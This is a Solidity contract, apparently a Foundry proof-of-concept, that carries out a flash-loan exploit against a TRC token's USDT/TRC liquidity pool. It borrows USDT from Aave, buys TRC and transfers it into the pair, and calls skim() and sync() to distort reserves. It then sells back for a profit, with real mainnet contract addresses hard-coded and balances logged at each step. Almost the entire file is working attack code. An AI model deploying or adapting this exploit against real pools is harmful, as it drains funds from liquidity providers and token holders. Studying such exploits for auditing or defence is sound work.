//SPDX-License-Identifier: None

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/aave/IPool.sol";
import "@interfaces/aave/IPoolAddressProvider.sol";
import "@interfaces/aave/IFlashLoanSimpleReceiver.sol";
import "@interfaces/IUniswapV2Router.sol";

contract Bot is Ownable, IFlashLoanSimpleReceiver {
    IPool public aavePool;

    IPoolAddressesProvider public constant aavePoolAddressesProvider =
        IPoolAddressesProvider(0xff75B6da14FfbbfD355Daf7a2731456b3562Ba6D);

    IUniswapV2Router public constant uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair public constant USDT_TRC_PAIR = IUniswapV2Pair(0xAAA9bb33E0c419743d154f6F68f98f5ff0d80D7f);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 public constant TRC = ERC20(0x58Bfa4398b3eF5E3672f32816c345aff7940E90C);

    constructor() Ownable(msg.sender) {
        aavePool = IPool(aavePoolAddressesProvider.getPool());
    }

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(uniswapRouter), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(uniswapRouter), 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(asset == address(USDT), "Invalid asset");
        require(initiator == address(this), "Invalid initiator");

        console.log("Before buy");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_TRC_PAIR)) / 10 ** USDT.decimals());
        console.log("Pool TRC balance =>", TRC.balanceOf(address(USDT_TRC_PAIR)) / 10 ** TRC.decimals());
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(TRC), USDT.balanceOf(address(this)), address(this)
        );

        console.log("After buy");
        console.log("Before donate");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_TRC_PAIR)) / 10 ** USDT.decimals());
        console.log("Pool TRC balance =>", TRC.balanceOf(address(USDT_TRC_PAIR)) / 10 ** TRC.decimals());
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 10 ** USDT.decimals());
        console.log("Bot TRC balance =>", TRC.balanceOf(address(this)) / 10 ** TRC.decimals());
        console.log();

        TRC.approve(address(USDT_TRC_PAIR), type(uint256).max);
        TRC.transfer(address(USDT_TRC_PAIR), TRC.balanceOf(address(USDT_TRC_PAIR)) * 1);

        console.log("After donate");
        console.log("Before skim");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_TRC_PAIR)) / 10 ** USDT.decimals());
        console.log("Pool TRC balance =>", TRC.balanceOf(address(USDT_TRC_PAIR)) / 10 ** TRC.decimals());
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 10 ** USDT.decimals());
        console.log("Bot TRC balance =>", TRC.balanceOf(address(this)) / 10 ** TRC.decimals());
        console.log();

        USDT_TRC_PAIR.skim(address(this));
        USDT_TRC_PAIR.sync();

        console.log("After skim");
        console.log("Before sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_TRC_PAIR)) / 10 ** USDT.decimals());
        console.log("Pool TRC balance =>", TRC.balanceOf(address(USDT_TRC_PAIR)) / 10 ** TRC.decimals());
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 10 ** USDT.decimals());
        console.log("Bot TRC balance =>", TRC.balanceOf(address(this)) / 10 ** TRC.decimals());
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(TRC), address(USDT), TRC.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_TRC_PAIR)) / 10 ** USDT.decimals());
        console.log("Pool TRC balance =>", TRC.balanceOf(address(USDT_TRC_PAIR)) / 10 ** TRC.decimals());
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 10 ** USDT.decimals());
        console.log("Bot TRC balance =>", TRC.balanceOf(address(this)) / 10 ** TRC.decimals());
        console.log();

        require(USDT.balanceOf(address(this)) > amount + premium, "No profit");

        USDT.approve(address(aavePool), amount + premium);

        return true;
    }

    function main(uint256 flashLoanAmount) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 10 ** USDT.decimals();

        bytes memory params = abi.encode();

        aavePool.flashLoanSimple(address(this), address(USDT), flashLoanAmount, params, 0);

        USDT.approve(address(aavePool), 0);
    }
}
